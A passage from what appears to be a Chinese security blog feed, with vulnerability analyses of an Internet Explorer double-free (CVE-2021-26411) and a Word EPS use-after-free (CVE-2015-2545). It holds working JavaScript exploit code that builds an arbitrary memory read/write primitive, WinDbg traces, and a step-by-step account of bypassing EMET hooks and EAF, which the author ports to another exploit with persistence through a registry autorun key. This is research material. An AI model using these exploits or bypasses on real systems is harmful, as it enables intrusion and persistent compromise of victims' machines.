            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">setUint16</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
        <span class="k">case</span> <span class="mi">32</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">writeData</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span>
        <span class="nx">write</span><span class="p">(</span><span class="nx">addr</span> <span class="o">+</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="mi">8</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">addrOf</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span>
    <span class="k">return</span> <span class="nx">read</span><span class="p">(</span><span class="nx">pArr</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">leak</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">dump</span><span class="p">(</span><span class="nx">hd2</span><span class="p">.</span><span class="nx">nodeValue</span><span class="p">))</span>
<span class="kd">var</span> <span class="nx">pAbf</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>		<span class="c1">//fake</span>
<span class="kd">var</span> <span class="nx">pArr</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span>		<span class="c1">//arr</span>
<span class="kd">var</span> <span class="nx">VT_I4</span> <span class="o">=</span> <span class="mh">0x3</span>
<span class="kd">var</span> <span class="nx">VT_DISPATCH</span> <span class="o">=</span> <span class="mh">0x9</span>
<span class="kd">var</span> <span class="nx">VT_BYREF</span> <span class="o">=</span> <span class="mh">0x4000</span>
<span class="kd">var</span> <span class="nx">bufArr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">fakeArr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">fake</span><span class="p">)</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="nx">setData</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_BYREF</span> <span class="o">|</span> <span class="nx">VT_I4</span><span class="p">,</span> <span class="nx">pAbf</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))</span>
<span class="nx">flush</span><span class="p">()</span>
<span class="kd">var</span> <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VBArray</span><span class="p">(</span><span class="nx">hd0</span><span class="p">.</span><span class="nx">nodeValue</span><span class="p">)</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="nx">bufArr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>	<span class="c1">//bufArr[0] = fake,bufArr[1] = arr</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span>
<span class="nx">setData</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_BYREF</span> <span class="o">|</span> <span class="nx">VT_I4</span><span class="p">,</span> <span class="nx">bufArr</span><span class="p">[</span><span class="mi">4</span><span class="p">]))</span>				<span class="c1">//fakeArray</span>
<span class="nx">setData</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_BYREF</span> <span class="o">|</span> <span class="nx">VT_I4</span><span class="p">,</span> <span class="nx">bufArr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x04</span><span class="p">))</span>		<span class="c1">//fakeArray+0x4</span>
<span class="nx">setData</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_BYREF</span> <span class="o">|</span> <span class="nx">VT_I4</span><span class="p">,</span> <span class="nx">bufArr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">))</span>		<span class="c1">//fakebuffer</span>
<span class="nx">flush</span><span class="p">()</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VBArray</span><span class="p">(</span><span class="nx">hd0</span><span class="p">.</span><span class="nx">nodeValue</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">vt</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">gc</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">bs</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="nx">fakeArr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">bufArr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
<span class="nx">fakeArr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">bs</span> <span class="o">+</span> <span class="mh">0x40</span>			
<span class="nx">fakeArr</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="nx">vt</span>
<span class="nx">fakeArr</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="nx">gc</span>					
<span class="nx">fakeArr</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span>			<span class="c1">//buffersize</span>
<span class="nx">setData</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_DISPATCH</span><span class="p">,</span> <span class="nx">bs</span><span class="p">))</span>
<span class="nx">flush</span><span class="p">()</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VBArray</span><span class="p">(</span><span class="nx">hd0</span><span class="p">.</span><span class="nx">nodeValue</span><span class="p">)</span>	<span class="c1">//abf[0]</span>
<span class="nx">god</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>	<span class="c1">//write-what-where读写原语</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span>
<span class="nx">pArr</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">read</span><span class="p">(</span><span class="nx">pArr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span>
<span class="nx">write</span><span class="p">(</span><span class="nx">read</span><span class="p">(</span><span class="nx">addrOf</span><span class="p">(</span><span class="nx">hd0</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</code></pre></div></div>

<p>执行hd0.nodeValue = alloc后，此时的hd2.nodeValue读写原语会被dic1.items()替换，并赋值给hd0.nodeValue：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec91c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)	//hd0.nodeValue = alloc
0:009&gt; p
eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec908=05cec8e0
0:009&gt; dd 0943b5b4-4	//dic1.items()已经占据了hd2.nodeValue的内存空间
0943b5b0  0000200c 00000000 06ff1320 00000000
0943b5c0  00000009 00000000 0963cd44 00000000
0943b5d0  00000009 00000000 09649004 00000000
0943b5e0  00000003 00000000 12341234 00000000
0943b5f0  00000003 00000000 12341234 00000000
0943b600  00000003 00000000 12341234 00000000
0943b610  00000003 00000000 12341234 00000000
0943b620  00000003 00000000 12341234 00000000
</code></pre></div></div>

<p>随后创建hd2.nodeValue的Uint32Array leak，该数组的作用就是将fake和arr数组的内存地址泄露出来，pAbf存放的是fake，pArr存放的是arr：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
eip=73869e6b esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec8c4={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}
0:009&gt; p
eax=0c564010 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000001 edi=00000001
eip=73869e6e esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec8b0=05cec888
0:009&gt; dd 0943b5b4-4	//hd2.nodeValue
0943b5b0  0000200c 00000000 06ff1320 00000000
0943b5c0  00000009 00000000 0963cd44 00000000	//fake
0943b5d0  00000009 00000000 09649004 00000000	//arr
0943b5e0  00000003 00000000 12341234 00000000
0943b5f0  00000003 00000000 12341234 00000000
0943b600  00000003 00000000 12341234 00000000
0943b610  00000003 00000000 12341234 00000000
0943b620  00000003 00000000 12341234 00000000
0:009&gt; dd 0963cd44 L8
0963cd44  73705654 73705638 7370562c 73705610
0963cd54  0963fed0 05d40888 00000000 00000002
0:009&gt; dd 0963fed0 L9	//该处正是fake的内存地址
0963fed0  7370514c 08dcc8c0 00000000 00000000
0963fee0  00000000 00000000 00000000 05d4d338
0963fef0  00000100
</code></pre></div></div>

<p>继续执行到flush()处，原本的abf已经存放了fake所在的内存结构：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec538 ebp=05cec5a0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec588={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//flush()
0:009&gt; dd 963ff00 L9	//abf
0963ff00  7370514c 08dcc8c0 00000000 00000000
0963ff10  00000000 095f8ee0 0c770460 05d61fe8
0963ff20  00020010
0:009&gt; dd 05d61fe8 L11*4	//abf中的内容，其中abf[1]中存放的值就是fake
05d61fe8  00000000 00000000 00000000 00000000
05d61ff8  00004003 00000000 0963cd44 00000000
05d62008  00004003 00000000 0963cd48 00000000
05d62018  00004003 00000000 0963cd4c 00000000
05d62028  00004003 00000000 0963cd50 00000000
05d62038  00004003 00000000 0963cd54 00000000
05d62048  00004003 00000000 0963cd58 00000000
05d62058  00004003 00000000 0963cd5c 00000000
05d62068  00004003 00000000 0963cd60 00000000
05d62078  00004003 00000000 0963cd64 00000000
05d62088  00004003 00000000 0963cd68 00000000
05d62098  00004003 00000000 0963cd6c 00000000
05d620a8  00004003 00000000 0963cd70 00000000
05d620b8  00004003 00000000 0963cd74 00000000
05d620c8  00004003 00000000 0963cd78 00000000
05d620d8  00004003 00000000 0963cd7c 00000000
05d620e8  00004003 00000000 0963cd80 00000000
0:009&gt; dd poi(0963cd44+10) L9	//fake
0963fed0  7370514c 08dcc8c0 00000000 00000000
0963fee0  00000000 09609100 00000000 05d4d338
0963fef0  00000100
</code></pre></div></div>

<p>当执行到var ref = new VBArray(hd0.nodeValue)时，查看hd0的内存，发现hd0.nodeValue已经被abf覆盖：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e413ed6 ebx=00ebd201 ecx=7209f6b0 edx=00400040 esi=02000001 edi=00000001
eip=73869e6b esp=05cec7b0 ebp=05cec810 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec7f8={MSHTML!CFastDOM::CNode::Trampoline_cloneNode (7209f6b0)}
0:009&gt; g
Breakpoint 0 hit
eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
eip=73869e6b esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec8c4={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}	//var ref = new VBArray(hd0.nodeValue)
0:009&gt; dd 05387200 L10	//hd0
05387200  715961ec 00000001 00000001 00000008
05387210  00000000 00000000 0a2f9cf0 00000000
05387220  ffffffff 093b32c4 0000200c 00000000
05387230  06ff1680 00000000 05382370 00000000
0:009&gt; du 093b32c4 
093b32c4  "handle"
0:009&gt; dd 06ff1680 L4
06ff1680  08800001 00000010 00000000 0943b5b0
0:009&gt; dd 0943b5b0		//hd0.nodeValue
0943b5b0  0002000a 00000000 00000000 00000000
0943b5c0  00004003 00000000 0963cd44 00000000
0943b5d0  00004003 00000000 0963cd48 00000000
0943b5e0  00004003 00000000 0963cd4c 00000000
0943b5f0  00004003 00000000 0963cd50 00000000
0943b600  00004003 00000000 0963cd54 00000000
0943b610  00004003 00000000 0963cd58 00000000
0943b620  00004003 00000000 0963cd5c 00000000
</code></pre></div></div>

<p>随后通过setData方法将abf[1]构造成一个ArrayBuffer结构，获取abf[1]到god中，执行到god = new DataView(ref.getItem(1))时，abf的内存结构如下：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-2-12_22-17-41.png" alt="" /></p>

<p>write-what-where读写原语构造完毕，随后通过该读写原语获取函数地址，调用最终实现利用。</p>

<h1 id="总结">总结</h1>

<p>此次利用的手法和之前分析过的word EPS文件漏洞十分相似，EPS和JS都是脚本语言，共同点都是通过UAF来覆盖释放后的内存结构，构造一段读写原语，再通过读写原语写入构造好的write-what-where字符串的结构。通过write-what-where字符串便可以轻松实现函数的获取和调用了。</p>

<p>不同点在于JS对象和EPS的对象结构在内存的布局不同，导致利用时需要了解JS对象的内存布局后才能构造出write-what-where字符串，在EPS中的利用手法如绕过EMET的R3HOOK和EAF可以在IE漏洞中复用。</p>

<p>此次分析大部分的时间花在对各种JS对象内存结构的寻找上，经过查找资料和手动调试，对于ArrayBuffer、Element、Attribute等结构有了深入的了解，下次在分析有这些对象参与的POC和EXP时可以快速的定位到这些对象的内存，同时也找到了对象内置函数的调用位置，可以快速定位代码执行位置和执行结果。</p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[漏洞信息 CVE：CVE-2021-26411 IE版本：IE 9-11 漏洞类型：Double free 漏洞模块：MSHTML.dll]]></summary></entry><entry><title type="html">CVE-2015-2545 EMET Bypass分析</title><link href="http://localhost:4000/2021-11-19/CVE-2015-2545" rel="alternate" type="text/html" title="CVE-2015-2545 EMET Bypass分析" /><published>2021-11-19T00:00:00+08:00</published><updated>2021-11-19T00:00:00+08:00</updated><id>http://localhost:4000/2021-11-19/CVE-2015-2545</id><content type="html" xml:base="http://localhost:4000/2021-11-19/CVE-2015-2545"><![CDATA[<h1 id="前言">前言</h1>

<p>该漏洞和上次分析的CVE-2017-0261为同一类型，同样是EPS文件解析产生的UAF漏洞，因此在分析时就不再讲解EPS的语法和相关结构了。分析该漏洞是因为样本能够完全绕过EMET，故此深入分析下绕过的原理并改造CVE-2017-0261绕过EMET。<!--more--></p>

<h2 id="调试环境">调试环境</h2>

<p>调试是直接在Office2007上进行调试，调试环境如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS:			Win7 x64 SP1
Office:		    	Ofiice 2007 x86
Image name: 		EPSIMP32.FLT
ImageSize:        	0x0006E000
File version:     	2006.1200.4518.1014
样本hash：	        375e51a989525cfec8296faaffdefa35
</code></pre></div></div>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="漏洞成因">漏洞成因</h2>

<p>在分析之前说明下dict对象的结构：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116160424215.png" alt="image-20211116160424215" /></p>

<p>查看eps文件，漏洞触发代码如图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909161555356.png" alt="image-20210909161555356" /></p>

<p>forall操作符遍历dict对象，在执行过程中使用copy将一个新的dict对象拷贝到正在遍历的dict对象中，此时原本的dict对象将会被释放。接着通过构造特殊结构的字符串对象，覆盖被释放的dict对象的结构，导致在第二次遍历dict的对象时去获取了构造好的字符串对象，这样便产生了一个有限大小的读写原语。</p>

<p>在windbg中定位到forall操作符的代码，查看此时操作栈的对象可以发现xx_41为遍历的对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909161900919.png" alt="image-20210909161900919" /></p>

<p>接着定位到copy操作符所在位置，查看此时操作栈的情况可以得知xx_41将会被xx_18467覆盖：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909162334445.png" alt="image-20210909162334445" /></p>

<p>继续深入分析，到图中所示执行操作符delete位置时，查看参数：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909170805435.png" alt="image-20210909170805435" /></p>

<p>经过分析可以发现eax的值正是xx_41中的keyZ1:</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909172455780.png" alt="image-20210909172455780" /></p>

<p>查看keyZ1，正是Dict_Object对象，里面储存的为0x1000大小的array对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116161548995.png" alt="image-20211116161548995" /></p>

<p>当执行完delete后，keyZ1所占有的内存被释放，随后一直循环delete直到整个xx_41的内容全部被释放。</p>

<p>执行完copy后，查看操作栈中发现xx_41的内容已经变成xx_18467：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909195153651.png" alt="image-20210909195153651" /></p>

<p>当执行到putinterval时，可以看到由于创建的字符串大小为35(0x23)，实际会分配0x24大小的结构用于存储字符串，而该大小正是dict对象结构的大小。因此当keyZ2被释放后，此时再次创建一个0x24大小的字符串将会占用keyZ2的内存空间：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909203306735.png" alt="image-20210909203306735" /></p>

<p>forall第二次要取的值仍为原来的keyZ2，但此时keyZ2指向的内存已经被故意构造的字符串占用，导致了UAF：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909204254869.png" alt="image-20210909204254869" /></p>

<p>当forall执行第二遍时，此时将把故意构造的字符串当作dict对象获取到操作栈中，key和value会被压入栈中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210910094751189.png" alt="image-20210910094751189" /></p>

<p>最终xx_26500获取了字符串，xx_19169获取了整数，从xx_26500的结构可以看出构造了一个大小为0x2710的读写原语：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116101956346.png" alt="image-20211116101956346" /></p>

<p>漏洞原理部分分析完毕。</p>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="构造读写原语">构造读写原语</h2>

<p>接下来参考上次分析的CVE-2017-0261的漏洞利用部分，尝试在了解漏洞原理的基础上自己构造读写原语，构造思路如下：</p>

<ol>
  <li>利用获取到的0x2710大小的xx_26500字符串对象构造指向string结构的0x30结构和0x28的string结构</li>
  <li>获取0x30结构和0x28结构的首地址，并使用两个地址指向首地址</li>
  <li>将构造好的读写原语的首地址放置在任意一个string对象的value2</li>
</ol>

<p>构造字符串结构很容易，但是要能获取到结构所在地址。因此在结构的位置上选取了xx_26500字符串中0xfc的位置，该位置存储的内容为指向后四个字节的地址可以准确的定位，因此将该值作为stringbase：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116163040737.png" alt="image-20211116163040737" /></p>

<p>接着开始构造指向string结构的0x30结构和0x28的string结构，通过putinterval操作符将构造好的结构放入stringbase+0xc的位置：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116180754750.png" alt="image-20211116180754750" /></p>

<p>将0x30结构的首地址放入stringbase中，0x28结构的首地址放入stringbase+4中，将stringbase+4的地址放入0x28结构的首地址0x24中，这样0x30结构就指向了0x28结构。具体的eps代码和结构如下图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211117192302813.png" alt="image-20211117192302813" /></p>

<p>构造好读写原语的相关结构后，就需要把结构首地址放置在任意一个string对象的value2后，这一步打算重复漏洞触发的过程，将构造好的读写原语的PostScript结构字符串覆盖原本正常的dict结构，最终获得了一个能够读写任意内存的读写原语：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118103740956.png" alt="image-20211118103740956" /></p>

<h2 id="emet-bypass分析">EMET Bypass分析</h2>

<p>样本在构造ROP这里开始Bypass EMET，不像一般的ROP直接调用VirtualProtect来修改内存属性，而是调用ZwProtectVirtualMemory。但是EMET对ZwProtectVirtualMemory进行hook，因此不能直接调用。样本获取到ZwProtectVirtualMemory的地址后会往后遍历，当遍历到retn后计数加一，直到遍历到没有被hook的函数后获取该函数的调用号，将调用号减去retn计数就得到了ZwProtectVirtualMemory原本的调用号：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118200720456.png" alt="image-20211118200720456" /></p>

<p>通过ROP将调用号赋值给eax，之后再通过调用未被hook的ZwCreateEvent函数的后5个字节直接调用ZwProtectVirtualMemory修改shellcode的内存：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118203213331.png" alt="image-20211118203213331" /></p>

<p>可以看到此时ZwProtectVirtualMemory是被hook的，而通过这种方式则完美绕过了hook：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118204947902.png" alt="image-20211118204947902" /></p>

<p>然而只绕过hook是不够的，需要shellcode绕过EAF，样本通过fs:[0]获取SEH链拿到msvcrt.dll的句柄，随后通过回退搜索MZ头寻找msvcrt.dll的基地址。通过msvcrt.dll的导入表获取函数地址并最终将shellcode后的PE文件写入到本地文件中并启动：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118211034227.png" alt="image-20211118211034227" /></p>

<h2 id="利用手法移植">利用手法移植</h2>

<p>在了解了样本的绕过思路后，在CVE-2017-0261上尝试绕过EMET。</p>

<p>首先将原本获取VirtualProtect的地址改为获取NtProtectVirtualMemory和NtCreateEvent：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118212457524.png" alt="image-20211118212457524" /></p>

<p>随后修改ROP链直接通过ZwProtectVirtualMemory的调用号调用ZwCreateEvent+0x5的位置修改内存属性，成功绕过了EMET：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211119115826229.png" alt="image-20211119115826229" /></p>

<p>shellcode由于样本采用了PE文件落地的方式，容易被查杀，因此修改shellcode采取syscall的方式直接写注册表自启项，最终成功绕过了EAF：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211119140836753.png" alt="image-20211119140836753" /></p>

<h1 id="总结">总结</h1>

<p>CVE-2015-2545是EPS文件解析类的首个漏洞，CVE-2016-0261无论是在漏洞触发和漏洞利用上都和该漏洞十分相似，连辅助函数都基本和2545保持一致。不同的是该样本通过syscall绕过了EMET对于关键函数的hook，这种绕过的思路可以应用在其他具有能读写任意内存的读写原语的漏洞中。同时shellcode也与传统的从PEB结构直接获取kernerl32.dll的基地址不同，通过SEH链获取msvcrt.dll的基地址在获取导入表函数地址绕过EAF，这种利用都是值得借鉴的。</p>

<h1 id="参考链接">参考链接</h1>

<p>[1] <a href="https://bbs.pediy.com/thread-216046.htm">野外的 CVE-2015-2545 逃逸了 EMET</a></p>

<p>[2] <a href="https://paper.seebug.org/368/">CVE-2015-2545 Word 利用样本分析</a></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 该漏洞和上次分析的CVE-2017-0261为同一类型，同样是EPS文件解析产生的UAF漏洞，因此在分析时就不再讲解EPS的语法和相关结构了。分析该漏洞是因为样本能够完全绕过EMET，故此深入分析下绕过的原理并改造CVE-2017-0261绕过EMET。]]></summary></entry><entry><title type="html">CVE-2017-0261 EPS文件解析漏洞分析</title><link href="http://localhost:4000/2021-09-07/CVE-2017-0261" rel="alternate" type="text/html" title="CVE-2017-0261 EPS文件解析漏洞分析" /><published>2021-09-07T00:00:00+08:00</published><updated>2021-09-07T00:00:00+08:00</updated><id>http://localhost:4000/2021-09-07/CVE-2017-0261</id><content type="html" xml:base="http://localhost:4000/2021-09-07/CVE-2017-0261"><![CDATA[<h1 id="前言">前言</h1>

